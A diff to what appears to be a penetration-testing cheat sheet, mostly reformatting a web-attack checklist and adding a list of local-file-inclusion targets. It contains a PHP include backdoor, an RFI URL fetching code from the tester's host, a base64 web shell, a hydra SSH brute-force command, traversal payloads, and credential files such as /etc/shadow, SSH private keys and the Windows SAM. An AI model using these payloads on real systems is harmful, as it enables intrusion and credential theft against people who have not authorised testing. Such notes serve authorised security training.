@@ -170,22 +170,22 @@ hydra -l root -P /usr/share/wordlists/password/10k <RHOST> -t 4 ssh
 
 ### Web scan (80, 443, 8080, 8081, 8443, and 3000)
 Things to be on look for:
-     - Visit all URLs from robots.txt.
-     - Default credentials for software
-     - Can I manipulate the URL to give me access to an account/directory I shouldn’t have?
-     - Any valuable information in the source code (Ctrl+U)
-     - SQL-injectable GET/POST params
-     - LFI/RFI through ?page=foo type params
-     - LFI:
-          /etc/passwd | /etc/shadow insta-win
-          /var/www/html/config.php or similar paths to get SQL etc creds
-          ?page=php://filter/convert.base64-encode/resource=../config.php
-          ../../../../../boot.ini to find out windows version
-    - RFI:
-          Have your PHP/cgi downloader ready
-          <?php include $_GET['inc']; ?> simplest backdoor to keep it dynamic without anything messing your output
-          Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on target machine
-          get phpinfo()
+- Visit all URLs from robots.txt.
+- Default credentials for software
+- Can I manipulate the URL to give me access to an account/directory I shouldn’t have?
+- Any valuable information in the source code (Ctrl+U)
+- SQL-injectable GET/POST params
+- LFI/RFI through ?page=foo type params
+- LFI:
+     /etc/passwd | /etc/shadow insta-win
+     /var/www/html/config.php or similar paths to get SQL etc creds
+     ?page=php://filter/convert.base64-encode/resource=../config.php
+     ../../../../../boot.ini to find out windows version
+- RFI:
+     Have your PHP/cgi downloader ready
+     <?php include $_GET['inc']; ?> simplest backdoor to keep it dynamic without anything messing your output
+     Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on target machine
+     get phpinfo()
 ```bash
 #Nikto
 nikto -h x.x.x.x
@@ -438,6 +438,57 @@ http://x.x.x.x/blah?parameter=php://input
 #Base64 conversion
 echo -n '<?php system($_GET['c']); ?>' | base64
 #output is PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
+```
+
+#### Useful LFI files (nulbyte)
+```
+../../../../../etc/passwd%00
+....//....//....//....//....//etc/passwd%00
+..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+------------------------
+#Linux:
+/etc/passwd
+/etc/shadow
+/etc/issue
+/etc/group
+/etc/hostname
+/etc/ssh/ssh_config
+/etc/ssh/sshd_config
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/home/user/.ssh/authorized_keys
+/home/user/.ssh/id_rsa
+------------------------
+#Apache:
+Configuration Files:
+/etc/apache2/apache2.conf
+/usr/local/etc/apache2/httpd.conf
+/etc/httpd/conf/httpd.conf
+------------------------
+#Log Files:
+Red Hat/CentOS/Fedora Linux-   /var/log/httpd/access_log
+Debian/Ubuntu-   /var/log/apache2/access.log
+FreeBSD-   /var/log/httpd-access.log
+------------------------
+#Generic:
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/apache2/access.log
+/var/log/apache/error.log
+------------------------
+#MySql:
+/var/lib/mysql/mysql/user.frm
+/var/lib/mysql/mysql/user.MYD
+/var/lib/mysql/mysql/user.MYI
+------------------------
+#Windows:
+/boot.ini
+/autoexec.bat
+/windows/system32/drivers/etc/hosts
+/windows/repair/SAM
+/windows/panther/unattended.xml
+/windows/panther/unattend/unattended.xml
+------------------------
 ```
 
 #### RFI
